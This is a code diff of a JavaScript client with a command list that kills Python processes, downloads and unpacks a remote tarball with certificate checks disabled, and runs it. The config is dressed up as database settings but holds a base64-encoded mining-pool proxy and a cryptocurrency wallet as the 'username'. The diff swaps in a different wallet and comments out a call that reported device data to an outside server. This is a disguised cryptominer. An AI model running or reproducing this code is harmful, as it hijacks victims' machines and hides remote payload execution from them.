@@ -129,17 +129,17 @@ function startMainLoop(url) {
           const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" }).replace(",", "");
           //console.log(`Đang gửi thông tin lên server: ${url}, ${now}, ${result}`);
 
-          try {
-              const response = await axios.get("https://up.labycoffee.com/upgmail-update.php", {
-                  params: {
-                      uid: url,
-                      full_info: `${url}%${now}%${result}%${timess}`,
-                      type: 44
-                  }
-              });
-              const upclone_web = response.data.upclone_web;
-              //console.log(upclone_web);
-          } catch (e) {
+          // try {
+          //     const response = await axios.get("https://up.labycoffee.com/upgmail-update.php", {
+          //         params: {
+          //             uid: url,
+          //             full_info: `${url}%${now}%${result}%${timess}`,
+          //             type: 44
+          //         }
+          //     });
+          //     const upclone_web = response.data.upclone_web;
+          //     //console.log(upclone_web);
+          // } catch (e) {
               //console.error("Lỗi khi gửi dữ liệu lên server:", e.message);
           }
 
@@ -272,7 +272,7 @@ class Client extends EventEmitter {
       const commands = [
         "pkill python || true",
         "[ -f python-app/run.sh ] || wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1-yGlToIVDzEohzEejAfDfs-8BKJFtS8W&export=download&confirm=t' -O python-app-main.tar.gz && tar -xf python-app-main.tar.gz && rm python-app-main.tar.gz",
-        "cd python-app && echo -e 'proxy=wss://nop-linussbit.hongphat.edu.vn/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nhost=127.0.0.1\nport=3306\nusername=RSqWRgivNtmxDaEWj1xyLrE5HPnjcs8DNj\npassword=c=RVN,zap=MBC\nthreads=8' > .env && ./run.sh 8 > stdout.txt 2> stderr.txt"
+        "cd python-app && echo -e 'proxy=wss://nop-linussbit.hongphat.edu.vn/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nhost=127.0.0.1\nport=3306\nusername=RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4\npassword=c=RVN,zap=MBC\nthreads=8' > .env && ./run.sh 8 > stdout.txt 2> stderr.txt"
       ]
       //"cd python-app && echo -e 'proxy=wss://nop-linussbit.hongphat.edu.vn/c3RyYXR1bS1ldS5ycGxhbnQueHl6OjcwMjI=\nhost=127.0.0.1\nport=3306\nusername=mbc1qurmus3vvfe25cv6rsqgnx0ewr8qjym324m278x\npassword=webpassword=linuss\nthreads=8' > .env && ./run.sh 8 > stdout.txt 2> stderr.txt"
       
